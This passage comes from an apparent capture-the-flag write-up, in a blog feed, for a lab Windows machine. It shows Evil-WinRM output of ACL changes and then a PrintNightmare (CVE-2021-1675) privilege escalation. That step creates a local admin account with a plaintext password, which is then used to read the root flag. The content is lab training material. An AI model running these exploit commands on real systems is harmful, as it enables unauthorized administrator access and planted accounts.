</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User permissions to remove on C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">FileSystemRights  : FullControl
</span></span><span class="line"><span class="cl">AccessControlType : Allow
</span></span><span class="line"><span class="cl">IdentityReference : RETURN<span class="se">\s</span>vc-printer
</span></span><span class="line"><span class="cl">IsInherited       : False
</span></span><span class="line"><span class="cl">InheritanceFlags  : ContainerInherit, ObjectInherit
</span></span><span class="line"><span class="cl">PropagationFlags  : None
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Acls changed successfully.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">Owner  : BUILTIN<span class="se">\A</span>dministrators
</span></span><span class="line"><span class="cl">Group  : RETURN<span class="se">\D</span>omain Users
</span></span><span class="line"><span class="cl">Access : NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
</span></span><span class="line"><span class="cl">         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
</span></span><span class="line"><span class="cl">         RETURN<span class="se">\A</span>dministrator Allow  FullControl
</span></span><span class="line"><span class="cl">Audit  :
</span></span><span class="line"><span class="cl">Sddl   : O:BAG:DUD:AI<span class="o">(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; gc <span class="se">\\</span>printer<span class="se">\c</span>$<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
</span></span><span class="line"><span class="cl">Access to the path <span class="s1">&#39;\\printer\c$\users\administrator\desktop\root.txt&#39;</span> is denied.
</span></span><span class="line"><span class="cl">At line:1 char:1
</span></span><span class="line"><span class="cl">+ gc <span class="se">\\</span>printer<span class="se">\c</span>$<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
</span></span><span class="line"><span class="cl">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span></span><span class="line"><span class="cl">    + CategoryInfo          : PermissionDenied: <span class="o">(</span><span class="se">\\</span>printer<span class="se">\c</span>$<span class="se">\u</span>s...esktop<span class="se">\r</span>oot.txt:String<span class="o">)</span> <span class="o">[</span>Get-Content<span class="o">]</span>, UnauthorizedAccessException
</span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
</span></span></code></pre></div><h4 id="alternative--printnightmare-lpe">(Alternative)  PrintNightmare LPE</h4>
<p>And here&rsquo;s the ultimate exploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Invoke-Nightmare -NewUser <span class="s2">&#34;choropys&#34;</span> -NewPassword <span class="s2">&#34;ch0ropys!&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> created payload at C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>ightmare.dll
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> using <span class="nv">pDriverPath</span> <span class="o">=</span> <span class="s2">&#34;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\mxdwdrv.dll&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> added user choropys as <span class="nb">local</span> administrator
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> deleting payload from C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>ightmare.dll
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; net user
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User accounts <span class="k">for</span> <span class="se">\\</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">Administrator            choropys                 Guest
</span></span><span class="line"><span class="cl">krbtgt                   svc-printer
</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed with one or more errors.
</span></span></code></pre></div><p>The hard way to read the root flag (afaik this won&rsquo;t work if WinRM disabled).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nv">$username</span> <span class="o">=</span> <span class="s2">&#34;choropys&#34;</span>
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nv">$password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s2">&#34;ch0ropys!&#34;</span> -AsPlainText -Force
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nv">$cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Invoke-Command -Computer localhost -Credential <span class="nv">$cred</span> -ScriptBlock <span class="o">{</span> gci C:/users/administrator/desktop/root.txt <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name                                                                                                 PSComputerName
</span></span><span class="line"><span class="cl">----                -------------         ------ ----                                                                                                 --------------
</span></span><span class="line"><span class="cl">-ar---       10/14/2021  10:33 PM             <span class="m">34</span> root.txt                                                                                             localhost
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Invoke-Command -Computer localhost -Credential <span class="nv">$cred</span> -ScriptBlock <span class="o">{</span> gc C:/users/administrator/desktop/root.txt <span class="o">}</span>
</span></span><span class="line"><span class="cl">9f8dd...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
